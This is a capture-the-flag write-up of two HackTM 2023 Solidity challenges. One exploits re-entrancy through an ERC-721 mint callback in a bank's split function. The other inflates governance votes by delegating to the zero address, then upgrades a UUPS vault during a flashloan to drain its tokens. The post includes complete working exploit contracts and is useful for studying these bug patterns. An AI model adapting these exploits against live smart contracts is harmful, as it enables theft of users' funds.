---
title: "Solving smart contract challenges in HackTM 2023 CTF Quals"
date: 2023-02-28
categories: CTF
--- 

This CTF had two smart contract challenges, **Dragon Slayer** and **Diamond Heist**.


# Dragon Slayer

> Prove yourself a true champion. Kill the mighty dragon and earn the right to call yourself a dragon slayer.
>
> `nc 34.141.16.87 30100`

The contracts for this challenge can be found in [`dragon_slayer_contracts.zip`](https://github.com/MiloTruck/smart-contract/blob/main/ctf/hacktm-2023/dragon-slayer/dragon_slayer_contracts.zip).

## Overview

We are provided with the following contracts:
* `Setup.sol`: The contract used to setup the challenge and check if the challenge is solved.
* `Item.sol`: An ERC-1155 contract that implements items equippable by our knight.
* `GoldCoin.sol`: An ERC-20 contract that implements ERC-20 tokens, known as gold coins, which are used as fungible currency.
* `BankNote.sol`: An ERC-721 contract that implements ERC-721 tokens, known as bank notes.

`Shop.sol` implements a contract to buy and sell items in exchange for gold coins. It sells the following items:

| `itemId` | `itemType`        | `attack`  | `defence` | `price`           |
| -------- | ----------------- | --------- | --------- | ----------------- |
| 1        | `ItemType.SWORD`  | 1         | 0         | `10 ether`        |
| 2        | `ItemType.SHIELD` | 0         | 1         | `10 ether`        |
| 3        | `ItemType.SWORD`  | 1,000,000 | 0         | `1_000_000 ether` |
| 4        | `ItemType.SHIELD` | 0         | 1,000,000 | `1_000_000 ether` |

`Dragon.sol` implements a contract that represents the enemy character, which has the following attributes:
* `health`: 1,000,000
* `clawAttack` and `fireAttack`: 1,000,000
* `defense`: 500,000 

`Knight.sol` implements a contract that represents our player, which also has its own `health`, `attack` and `defence` attributes. The relevant functions in the contract are:
* `fightDragon()`: Fights the dragon - receive an attack from the dragon and then attack it.
* `buyItem()`, `sellItem()`: Buy and sell items from the shop. Items that are bought are equipped, which changes the `attack` and `defence` attributes of the knight.
* `bankDeposit()`, `bankTransferPartial()`: Functions for the knight to interact with the `Bank` contract. Note that there are also other functions not listed here that interact with the `Bank` contract.

`Bank.sol` implements a `Bank` contract, which facillitates the exchange of gold coins for a non-fungible bank note. It has the following relevant functions:
  * `deposit()`: Deposit an amount of gold coins for a bank note.
  * `withdraw()`: Burn a bank note to withdraw its amount of gold coins.
  * `merge()`: Merge multiple bank notes into a new bank note.
  * `split()`: Split a single bank note into multiple new bank notes.
  * `transferPartial()`: Transfer an amount of gold coins from one bank note to another.

At the start of the challenge, the knight has only `10 ether` gold coins. The knight is also equipped with items `1` and `2`, thus he only has 1 `attack` and 1 `defense`.

Through the `Setup` contract, we are able to claim ownership of the knight:
```solidity
function claim() external {
    require(!claimed, "ALREADY_CLAIMED");
    claimed = true;
    knight.transferOwnership(msg.sender);
}
```

To solve the challenge, we have to reduce the dragon's health to 0 while our knight still has health:
```solidity
function isSolved() external view returns (bool) {
    return knight.health() > 0 && knight.dragon().health() == 0;
}
```

Essentially, we have to fight the dragon with our knight and defeat it. However, due to the dragon's high health, attack and defense attributes, the knight has to purchase and equip items `3` and `4` before fighting the dragon.

However, items `3` and `4` cost a total of `2_000_000 ether` gold coins, which is way more than what we have initially. If only there was a way to create gold coins out of thin air...

## The vulnerability

In the `BankNote` contract, the `mint()` function uses `_safeMint()`:
```solidity
function mint(address to, uint256 tokenId) public onlyOwner {
        _safeMint(to, tokenId);
}
```

`safeMint()` checks if the receiving address is capable of receiving ERC-721 tokens before minting the token. According to [OpenZeppelin's documentation](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#ERC721-_safeMint-address-uint256-):
> If `to` refers to a smart contract, it must implement `IERC721Receiver.onERC721Received`, which is called upon a safe transfer.
This means that if the receiving address is a smart contract, it has to implement an `onERC721Received()` function, which is expected to return `this.onERC721Received.selector`. 

In [OpenZeppelin's ERC-721 implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol), whenever a token is minted to a contract, `_safeMint()` calls `_checkOnERC721Received()`, which invokes the `onERC721Received()` function of the receiving contract. As such, when `mint()` is called in the `BankNote` contract, execution flow is passed to the receiving contract temporarily before the bank note is minted.

With this knowledge, we can spot a vulnerability in the `split()` function in `Bank.sol`:
```solidity
function split(uint bankNoteIdFrom, uint[] memory amounts) external {
    uint totalValue;
    require(bankNote.ownerOf(bankNoteIdFrom) == msg.sender, "NOT_OWNER");
    for (uint i = 0; i < amounts.length; i++) {
        uint value = amounts[i];
        _ids.increment();
        uint bankNoteId = _ids.current();
        bankNote.mint(msg.sender, bankNoteId);
        bankNoteValues[bankNoteId] = value;
        totalValue += value;
    }
    require(totalValue == bankNoteValues[bankNoteIdFrom], "NOT_ENOUGH");
    bankNote.burn(bankNoteIdFrom);
    bankNoteValues[bankNoteIdFrom] = 0;
}
```

Notice the following: 
* If `msg.sender` is a contract, `bankNote.mint(msg.sender, bankNoteId)` allows `msg.sender` to hijack execution flow temporarily through its `onERC721Received()` function.
* The function mints all resulting bank notes with their values from `amounts` before checking that the value of `bankNoteIdFrom` is equal to the sum of `amounts`, as seen in the `require` statement.

As the function performs minting before the check, it violates the [Checks-Effects-Interactions pattern](https://docs.soliditylang.org/en/v0.8.19/security-considerations.html#re-entrancy), making it vulnerable to re-entrancy. This can be exploited to temporarily own any amount of gold coins:
1. An attacker contract calls `split()` with the following arguments:
   *  `bankNoteIdFrom` - a bank note with no value owned by the attacker. We'll call this *bankNoteA*.
   *  `amount` - `[x, 0]`, where `x` can be any arbitrary amount of gold coins the attacker needs.
2. In the first iteration of the for-loop in `split()`:
   * When `bankNote.mint()` is called, the attacker does nothing in the `onERC721Received()` callback.
   * A new bank note is minted to the attacker and assigned the value `x`. We'll call this *bankNoteB*.
3. By the second iteration, the attacker owns *bankNoteB*, which has a value of `goldCoinAmount`. 
Thus, when `bankNote.mint()` is called again, the attacker does the following in the `onERC721Received()` callback:
   * Withdraws *bankNoteB* in exchange for `x` amount of gold coins and does whatever he wants with them.
   * Before `onERC721Received()` returns, the attacker has to deposit `x` amount of gold coins and transfer them to *bankNoteA*. 
1. When the for-loop terminates, the check at the end of `split()` passes as both `totalValue` and `bankNoteValues[bankNoteIDFrom]` equal to `x`.

For those who are familiar with smart contracts, this looks very similar to a [flash loan](https://docs.aave.com/faq/flash-loans). We can borrow any arbitrary amount of gold coins provided that we return them at the end of the function.

## Solving the challenge
With the vulnerability above, solving the challenge becomes trivial. We create an attacker contract which does the following:
1. **Obtain a bank note:** As our attacker contract has no gold coins, it cannot call `deposit()`. Instead, we call `merge()` with an empty array:
```solidity
// Get an empty banknote (id 1)
uint[] memory bankNoteIDsFrom = new uint[](0);
bank.merge(bankNoteIDsFrom);
```

2. **Exploit the vulnerability:** We then call `split()` with our empty bank note and `amount = [2_000_000 ether, 0]` to gain `2_000_000 ether` worth of gold coins:
```solidity
// Abuse bank.split() to "borrow" 2,000,000 ether
uint[] memory amounts = new uint[](2);
amounts[0] = goldCoinAmount;
bank.split(1, amounts);
```
1. **Fight the dragon:** In the second callback to `onERC721Received()`, we do the following:
   1. Withdraw our `2_000_000 ether` gold coins from the bank note.
   2. Transfer all gold coins to the knight.
   3. Knight buys items `3` and `4` with all the gold coins.
   4. Knight fights the dragon until its health is 0.
   5. Knight sells items `3` and `4` to gain back the `2_000_000 ether` gold coins. 
   6. Knight deposits the gold coins and transfers it to the attacker contract's bank note. 

## Exploit code
[`Exploit.sol`](https://github.com/MiloTruck/smart-contract/blob/main/ctf/hacktm-2023/dragon-slayer/Exploit.sol), which contains the full exploit code, is as shown:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./dragon_slayer_contracts/Setup.sol";
import "./dragon_slayer_contracts/Knight.sol";
import "./dragon_slayer_contracts/Dragon.sol";
import "./dragon_slayer_contracts/Bank.sol";
import "./dragon_slayer_contracts/GoldCoin.sol";

contract Exploit {
    // Challenge contracts
    Setup public setup;
    Knight public knight;
    Dragon public dragon;
    Bank public bank;
    GoldCoin public goldCoin;

    // Counts the number of times onERC721Received is called
    uint256 hitCount;

    // Amount of gold coins required to solve the challenge
    uint256 constant goldCoinAmount = 2_000_000 ether;

    constructor(Setup _setup) {
        // Initialize challenge contracts
        setup = _setup;
        knight = setup.knight();
        dragon = knight.dragon();
        bank = knight.bank();
        goldCoin = bank.goldCoin();

        // Claim ownership of Knight contract
        setup.claim();
    }

    function exploit() public {
        // Get an empty banknote (id 1)
        uint[] memory bankNoteIDsFrom = new uint[](0);
        bank.merge(bankNoteIDsFrom);

        // Abuse bank.split() to "borrow" 2,000,000 ether
        uint[] memory amounts = new uint[](2);
        amounts[0] = goldCoinAmount;
        bank.split(1, amounts);
    }

    function onERC721Received(address, address, uint256, bytes calldata) public returns (bytes4) {
        // Only perform the exploit on the third onERC721Received call
        if (hitCount == 2) {
            // Withdraw all gold coins from banknote (id 2)
            bank.withdraw(2);

            // Transfer all coins to Knight
            goldCoin.transfer(address(knight), goldCoinAmount);
            
            // Buy items 3 and 4
            knight.buyItem(3);
            knight.buyItem(4);

            // Fight Dragon until its health is 0
            while (dragon.health() > 0) {
                knight.fightDragon();
            }

            // Sell items 3 and 4
            knight.sellItem(3);
            knight.sellItem(4);

            // Deposit gold coins into a new banknote (id 4)
            knight.bankDeposit(goldCoinAmount);

            // Transfer all gold coins back to this contract's banknote (id 1)
            knight.bankTransferPartial(4, goldCoinAmount, 1);
        }
        
        // Increment the counter by 1
        hitCount += 1;

        return this.onERC721Received.selector;
    }

}
```

<br>
<br>

# Diamond Heist

> Salty Pretzel Swap DAO has recently come out with their new flashloan vaults. They have deposited all of their 100 Diamonds in one of their vaults.
> 
> Your mission, should you choose to accept it, is to break the vault and steal all of the diamonds. This would be one of the greatest heists of all time.
> 
> This text will self-destruct in ten seconds.
> 
> Good luck.
>
> `nc 34.141.16.87 30200`

The contracts for this challenge can be found in [`diamond_heist_contracts.zip`](https://github.com/MiloTruck/smart-contract/blob/main/ctf/hacktm-2023/diamond-heist/diamond_heist_contracts.zip).

## Overview

We are provided with the following contracts:
* `Setup.sol`: The contract used to setup the challenge and check if the challenge is solved.
* `Diamond.sol`: An ERC-20 contract that implements ERC-20 tokens known as diamonds.
* `Burner.sol`: A contract which contains a `selfdestruct` call to itself. (This contract is not important)

`SaltyPretzel.sol` is an ERC-20 contract that implements a governance token contract. Essentially, owning more SaltyPretzel tokens would give a user more votes, which is useful in a system that implements [governance](https://ethereum.org/en/governance/). This contract will be explained more in-depth later on.

`Vault.sol` implements a `Vault` contract that is used to store diamonds. It is meant to be an proxy implementation contract as it follows the [UUPSUpgradeable](https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable) pattern. It has the following interesting functions:
* `governanceCall()`: Allows the vault's owner or anyone with sufficient votes to execute any of this contract's functions.
* `flashloan()`: A function to take out a [flash loan](https://docs.aave.com/faq/flash-loans) of any token.

`VaultFactory.sol` contains a contract that deploys `Vault` as an [`ERC1967Proxy`](https://docs.openzeppelin.com/contracts/4.x/api/proxy#ERC1967Proxy).

At the start of the challenge, 100 diamonds are transferred to the vault after it is initialized, as seen in `Setup.sol`:
```solidity
uint constant public DIAMONDS = 100;
// ...
constructor () {
    vaultFactory = new VaultFactory();
    vault = vaultFactory.createVault(keccak256("The tea in Nepal is very hot."));
    diamond = new Diamond(DIAMONDS);
    saltyPretzel = new SaltyPretzel();
    vault.initialize(address(diamond), address(saltyPretzel));
    diamond.transfer(address(vault), DIAMONDS);
}
```

Using the `claim()` function, we are able to mint `100 ether` worth of SaltyPretzel tokens for ourselves. This can only be done once:
```solidity
uint constant public SALTY_PRETZELS = 100 ether;
// ...
function claim() external {
    require(!claimed);
    claimed = true;
    saltyPretzel.mint(msg.sender, SALTY_PRETZELS);
}
```

To solve the challenge, the `Setup` contract must have a balance of 100 diamonds:
```solidity
function isSolved() external view returns (bool) {
    return diamond.balanceOf(address(this)) == DIAMONDS;
}
```

As all the diamonds were transferred to the vault at the start of the challenge, we have to  find a way to drain the vault of its 100 diamonds...

## The vulnerability

The `SaltyPretzel` contract implements its own accounting system to keep track of everyone's voting power. Users are also able to delegate their votes to another user, giving the delegatee more voting power. 

At the core of this vote accounting system are the `_delegate()` and `_moveDelegates()` functions:
```solidity
function _delegate(address delegator, address delegatee)
    internal
{
    address currentDelegate = _delegates[delegator];
    uint256 delegatorBalance = balanceOf(delegator);
    _delegates[delegator] = delegatee;
    emit DelegateChanged(delegator, currentDelegate, delegatee);
    _moveDelegates(currentDelegate, delegatee, delegatorBalance);
}
function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {
    if (srcRep != dstRep && amount > 0) {
        if (srcRep != address(0)) {
            uint32 srcRepNum = numCheckpoints[srcRep];
            uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;
            uint256 srcRepNew = srcRepOld - amount;
            _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);
        }
        if (dstRep != address(0)) {
            uint32 dstRepNum = numCheckpoints[dstRep];
            uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;
            uint256 dstRepNew = dstRepOld + amount;
            _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);
        }
    }
}
```

`_delegate()` first sets the `delegatee` of `delegator`, then calls `_moveDelegates()` to transfer the balance of `delegator` (ie. his votes) from the old delegatee to the new one.

`_moveDelegates()` then subtracts `amount` votes from `srcRep`, which in this case, would be the old delegatee, and adds them to `dstRep`, which would be the new delegatee. Notice the following checks:
* If `srcRep == dstRep` or `amount == 0`, the function does not do anything. 
* If `srcRep == address(0)`, the votes are not deducted from `srcRep`.
* If `dstRep == address(0)`, the votes are not added to `dstRep`.

Users can also change their `delegatee` through the `delegate()` function:
```solidity
function delegate(address delegatee) external {
    return _delegate(msg.sender, delegatee);
}
```

While looking at how `_moveDelegates()` is used, I noticed the following in `mint()`:
```solidity
function mint(address _to, uint256 _amount) public onlyOwner {
    _mint(_to, _amount);
    _moveDelegates(address(0), _delegates[_to], _amount);
}
```

When new tokens are minted, the contract has to "create" votes to increase the voting power of the recipient. To do so, `mint()` calls `_moveDelegates()` with `srcRep` as `address(0)`, which does not deduct votes from `srcRep` but simply adds them to `dstRep`.

This gave me an idea - if we could set our `delegatee` to `address(0)`, we would essentially be able to repeatedly create votes out of thin air, similar to `mint()`. Setting our `delegatee` to `address(0)` can be achieved by doing the following:
1. Transfer our SaltyPretzel tokens to another contract to make our balance 0.
2. Call `delegate()` with `address(0)` as our `delegatee`. This works as `_delegate()` would call `_moveDelegates()` with `amount = 0`, thus no transfer of votes occurs.

After setting `delegatee` to `address(0)`, we are able to increase the voting power of any other user through the following:
* Transfer our SaltyPretzel tokens back to our address.
* Call `delegate()`, with `delegatee` as the user we wish to add votes to. Note that `delegatee` cannot be our own address as `srcRep` cannot be equal to `dstRep` in `_moveDelegates()`, as mentioned above.

Thereforce, by repeatedly setting our `delegatee` to `address(0)`, then regaining our tokens and calling `delegate()`, we are able to increase anyone's voting power by any arbitrary amount.

## Solving the challenge

Now that we have the ability to gain infinite votes, how do we solve the challenge?

As `Vault` is a `UUPSUpgradeable` proxy contract, it inherits the an `upgradeTo()` function, which can be used to upgrade the implementation contract of `Vault`:
```solidity
function upgradeTo(address newImplementation) external virtual onlyProxy {
    _authorizeUpgrade(newImplementation);
    _upgradeToAndCallUUPS(newImplementation, new bytes(0), false);
}
````

The `_authorizeUpgrade()` function is overridden in the current implementation of `Vault`: 
```solidity
function _authorizeUpgrade(address) internal override view {
    require(msg.sender == owner() || msg.sender == address(this));
    require(IERC20(diamond).balanceOf(address(this)) == 0);
}
```

To change the implementation of `Vault` to our own contract, the following two requirements have to be met:
1. `msg.sender` has to be either owner or `Vault` itself.
2. `Vault` must have no diamonds.

Since the owner of `Vault` is the `Setup` contract, the first criteria can only be achieved by calling `upgradeTo()` through the `Vault` itself. Luckily for us, `Vault` contains a `governanceCall()` function:
```solidity
function governanceCall(bytes calldata data) external {
    require(msg.sender == owner() || saltyPretzel.getCurrentVotes(msg.sender) >= AUTHORITY_THRESHOLD);
    (bool success,) = address(this).call(data);
    require(success);
}
```

As we now have the ability to gain infinite votes, we can make `Vault` call any of its functions through `governanceCall()`. To meet the first requirement, we simply use `governanceCall()` to call `upgradeTo()`, which would make `msg.sender` the `Vault` itself.

To fulfil the second criteria, we utilize the `flashloan()` function:
```solidity
function flashloan(address token, uint amount, address receiver) external {
    uint balanceBefore = IERC20(token).balanceOf(address(this));
    IERC20(token).transfer(receiver, amount);
    IERC3156FlashBorrower(receiver).onFlashLoan(msg.sender, token, amount, 0, "");
    uint balanceAfter = IERC20(token).balanceOf(address(this));
    require(balanceBefore == balanceAfter);
}
```
We take out a flashloan to borrow all of `Vault`'s diamonds, and then make the `governanceCall() -> upgradeTo()` call in the `onFlashLoan()` callback. This way, when `upgradeTo()` is called, `Vault` will temporarily have no diamonds.

## Exploit code
The exploit code is split contains three contracts:
* `Exploit` mainly handles abusing the vulnerability to gain sufficient votes.
* `VoteCollector` is used to solve the challenge after it has enough votes.
* `FakeVault` is the new vault implementation used to drain the vault.

[`Exploit.sol`](https://github.com/MiloTruck/smart-contract/blob/main/ctf/hacktm-2023/diamond-heist/Exploit.sol)
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./diamond_heist_contracts/Setup.sol";
import "./diamond_heist_contracts/Vault.sol";
import "./diamond_heist_contracts/Diamond.sol";
import "./diamond_heist_contracts/SaltyPretzel.sol";

contract Exploit {
    // Challenge contracts
    Setup public setup;
    Vault public vault;
    SaltyPretzel public saltyPretzel;

    constructor(Setup _setup) {
        // Initialize challenge contracts
        setup = _setup;
        vault = setup.vault();
        saltyPretzel = setup.saltyPretzel();

        // Claim initial SaltyPretzel tokens
        setup.claim();
    }

    function exploit() public {
        // Create a contract contract to hoard votes
        VoteCollector voteCollector = new VoteCollector(setup);

        // Loop while VoteCollector has not enough votes
        while (saltyPretzel.getCurrentVotes(address(voteCollector)) < vault.AUTHORITY_THRESHOLD()) {
            // Add our votes to VoteCollector 
            saltyPretzel.delegate(address(voteCollector));

            // Set our delegatee to address(0)
            saltyPretzel.transfer(address(voteCollector), setup.SALTY_PRETZELS());
            saltyPretzel.delegate(address(0));

            // Regain our SaltyPretzel tokens
            saltyPretzel.transferFrom(address(voteCollector), address(this), setup.SALTY_PRETZELS());
        }

        // When VoteCollector has enough votes, steal the vault's diamonds
        voteCollector.stealDiamonds();
    }
}

contract VoteCollector {
    // Challenge contracts
    Setup public setup;
    Vault public vault;
    Diamond public diamond;
    SaltyPretzel public saltyPretzel;

    constructor(Setup _setup) {
        // Initialize challenge contracts
        setup = _setup;
        vault = setup.vault();
        diamond = setup.diamond();
        saltyPretzel = setup.saltyPretzel();

        // Allow the Exploit contract to transfer all of this contract's SaltyPretzel tokens
        saltyPretzel.approve(msg.sender, type(uint256).max);
    }

    function stealDiamonds() public {
        // Borrow a flashloan to temporarily set the vault's diamond balance to 0
        vault.flashloan(address(diamond), setup.DIAMONDS(), address(this));

        // After the vault is upgraded to FakeVault, transfer its diamonds to Setup
        FakeVault(address(vault)).transferDiamonds(address(setup));
    }

    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns(bytes32) {
        // Create a FakeVault contract
        FakeVault fakeVault = new FakeVault();

        // Upgrade the implementation of vault to FakeVault
        bytes memory data = abi.encodeWithSelector(vault.upgradeTo.selector, address(fakeVault));
        vault.governanceCall(data);

        // Return the borrowed diamonds to vault
        diamond.transfer(address(vault), setup.DIAMONDS());

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract FakeVault is Initializable, UUPSUpgradeable, OwnableUpgradeable {    
    // Keep the diamond state variable
    Diamond diamond;

    // Function to transfer all of the vault's diamonds
    function transferDiamonds(address to) public {
        diamond.transfer(to, diamond.balanceOf(address(this)));
    }
    
    // _authorizeUpgrade has to be implemented for UUPSUpgradeable contracts
    function _authorizeUpgrade(address) internal override view {}
}
```